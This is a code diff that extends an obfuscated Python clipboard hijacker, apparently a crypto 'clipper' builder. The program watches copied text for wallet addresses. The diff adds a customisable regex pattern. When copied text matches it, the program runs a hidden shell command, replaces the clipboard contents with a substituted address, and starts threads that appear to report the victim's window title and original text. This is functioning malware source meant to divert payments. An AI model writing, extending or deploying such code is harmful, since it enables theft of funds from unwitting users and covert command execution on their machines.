@@ -43,6 +43,8 @@ hrextr_R2Xoy3 = '%MONERO%'
 hrextr_R2Xoy4 = '%LTC%'
 hrextr_R2Xoy5 = '%DOGE%'
 hrextr_R2Xoy6 = '%TRX%'
+hrextr_R2Xoy7 = r'%PAT%'
+hrextr_R2Xoy8 = '%PX%'
 
 def esuih():
     try:
@@ -176,6 +178,10 @@ def vdsu281cjm():
 
     wadyhe_cery6 = hbgidr.match(r'\bT[a-zA-Z0-9]{32,33}\b', hfruieoawd)
     wadyhe_cery66 = bool(wadyhe_cery6)
+
+    wadyhe_cery7 = hbgidr.match(hrextr_R2Xoy7, hfruieoawd)
+    wadyhe_cery77 = bool(wadyhe_cery7)
+
 
     greduhio.sleep(0.25)
     if wadyhe_cery11 == True:
@@ -316,6 +322,25 @@ def vdsu281cjm():
 
                 if regh54 != 'None':
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6)).start()
+
+    elif wadyhe_cery77 == True:
+        if hrextr_R2Xoy7 != 'None':
+            frewsuih = yxvcre.getActiveWindow()
+            if wadyhe_cery7.group() != hrextr_R2Xoy8:
+                try:
+                    xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
+                except Exception as e:
+                    pass
+                awd42321dsa.copy(hrextr_R2Xoy8)
+                if deswsjn != 'None':
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Custom [X]', hfruieoawd, hrextr_R2Xoy8)).start()
+
+                if kuhio49 != 'None':
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Custom [X]', hfruieoawd, hrextr_R2Xoy8))).start()
+
+                if regh54 != 'None':
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Custom [X]', hfruieoawd, hrextr_R2Xoy8)).start()
+
 
     else:
         pass
